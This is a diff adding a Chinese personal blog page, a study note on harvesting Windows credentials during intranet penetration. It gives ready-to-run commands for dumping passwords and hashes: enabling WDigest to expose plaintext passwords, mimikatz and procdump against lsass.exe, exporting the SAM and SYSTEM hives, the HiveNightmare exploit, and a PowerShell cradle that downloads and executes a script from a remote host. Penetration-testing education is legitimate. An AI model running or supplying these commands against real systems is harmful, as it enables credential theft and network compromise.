@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>内网渗透体系建设--第2章--内网资源探测--用户凭证收集 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="SAM文件
+SAM文件是Windows用户的账户数据库,位于%SystemRoot%\System32\Config目录中,所有本地用户的用户名, 密码哈希等信息都被存放在这个数据库文件中。（本地用户）
+lsass.exe进程
+lsass...." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">内网渗透体系建设--第2章--内网资源探测--用户凭证收集</h2>
+            <div class="post-date">2023-04-02</div>
+            
+            <div class="post-content" v-pre>
+              <p><strong>SAM文件</strong><br>
+SAM文件是Windows用户的账户数据库,位于%SystemRoot%\System32\Config目录中,所有本地用户的用户名, 密码哈希等信息都被存放在这个数据库文件中。（本地用户）</p>
+<p><strong>lsass.exe进程</strong><br>
+lsass.exe是Windows的一个系统进程, 用于实现系统的安全机制, 主要用于本地安全和登录策略. 通常在用户输入密码完成验证开始登录用户的时候, 登录的域名, 用户名,登录凭据等信息都会存储在lsass.exe的进程空间中, 用户的密码则是通过WDigest和Tspkg模块调用后使用可逆的加密算法加密后存储在内存中。（登录过的用户，包含域用户）</p>
+<p>在用户登录的时候用户的明文密码会通过WDigest和Tspkg模块调用后再加密存储在lsass.exe的内存中, 但是为了防止用户明文密码在内存中泄露, 微软在2014年5月发布了KB2871997补丁, 关闭了WDigest功能, 禁止从内存中读取明文密码, 且Windows Server 2012及以上版本默认关闭WDigest功能。</p>
+<p>可修改注册表开启WDigest功能，当用户重新登录后即可重新获取明文密码。</p>
+<pre><code>开启WDigest
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+关闭WDigest
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
+</code></pre>
+<p><strong>1.凭证收集--在线读取lsass.exe进程内存</strong></p>
+<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit 
+#从lsass.exe进程的内存中读取当前已登录用户的凭据(需要管理员身份执行,否则会DebugPrivilege权限获取失败)
+#privilege::debug提升至DebugPrivilege权限
+#sekurlsa::logonpasswords导出用户凭据
+</code></pre>
+<p><s>域用户似乎无法直接读取，需要本地用户</s></p>
+<p><strong>2.凭证收集--离线读取lsass.exe进程内存</strong></p>
+<p>procdump-配合-minikatz</p>
+<p>将lsass.exe的进程内存转储，将内存文件导出到本地后通过mimikatz进行离线读取，用于转存进程内存的工具有很多，如Out Mini dump.psl，Procdump，SharpDump等。甚至可以手工加载系统自带的comsvcs.dll来实现内存转储。<br>
+这里使用微软官方Procdump工具。</p>
+<pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
+#加载内存文件
+sekurlsa::minidump lsass.dmp
+#导出用户凭证
+sekurlsa::logonPassword full
+</code></pre>
+<p><strong>3.在线读SAM文件</strong></p>
+<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit
+#privilege::debug提升至DebugPrivilege权限
+#token::elevate提示SYSTEM权限
+#读取本地sam
+</code></pre>
+<p><strong>4.离线读SAM文件</strong><br>
+为了提高SAM文件的安全性以防止离线破解, Windows会对SAM文件使用秘钥进行加密, 这个秘钥存储在SYSTEM文件中, 与SAM位于同一个目录下.</p>
+<p>在系统运行时,SAM和SYSTEM这两个文件是被锁定的, 所以需要借助一些工具来实现。</p>
+<p><code>4.1PowerSplit--Invoke-NinjaCopy.ps1</code><br>
+本地：</p>
+<pre><code>Invoke-NinjaCopy -Path 'C:\Windows\System32\config\SAM' -LocalDestination 'C:\Users\h0cksr\Desktop\SAM'
+Invoke-NinjaCopy -Path 'C:\Windows\System32\config\SYSTEM' -LocalDestination 'C:\Users\h0cksr\Desktop\SYSTEM'
+</code></pre>
+<p>远程：</p>
+<pre><code>powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path 'C:\Windows\System32\config\SAM' -LocalDestination 'C:\SAM'&quot;  
+powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path 'C:\Windows\System32\config\SYSTEM' -LocalDestination 'C:\SYSTEM'&quot;  
+</code></pre>
+<p><code>4.2通过HiveNightmare漏洞(CVE-2021-36934)</code><br>
+从系统卷影副本中访问和转储SAM,SYSTEM文件。<br>
+系统卷影副本,需要创建有系统还原点, 其影响范围为Windwos10 Version 1809以来发布的全部版本, 包括Win11在内。<br>
+1.</p>
+<pre><code>icacls C:\Windows\System32\config\SAM    #在一般用户权限下执行即可, 若是输出&quot;BUILTIN\Users:(I)(RX)&quot;则表示系统易受攻击
+</code></pre>
+<p>2.下载HiveNightmare.exe然后将其上传到靶机, 直接执行HiveNightmare.exe就会在当前目录下导出生成SAM,SYSTEM,SECURITY三个文件<br>
+https://github.com/GossiTheDog/HiveNightmare/releases/download/0.6/HiveNightmare.exe</p>
+<p>3.运行Impacket的secretsdump.py导出SAM文件中的哈希值</p>
+<pre><code>python3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL
+</code></pre>
+<p><code>4.3在管理员权限下通过保存注册表的方式导出</code></p>
+<pre><code>reg save HKEY_LOCAL_MACHINE\SAM\SAM sam.hive    #导出SAM注册表
+reg save HKEY_LOCAL_MACHINE\SYSTEM system.hive  #导出SYSTEM注册表
+
+mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit  #使用mimikatz读取SAM文件内容
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-duan-kou-sao-miao/">
+                  <h3 class="post-title">
+                    内网渗透体系建设--第2章--内网资源探测--端口扫描--msf探测--端口Banner信息
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
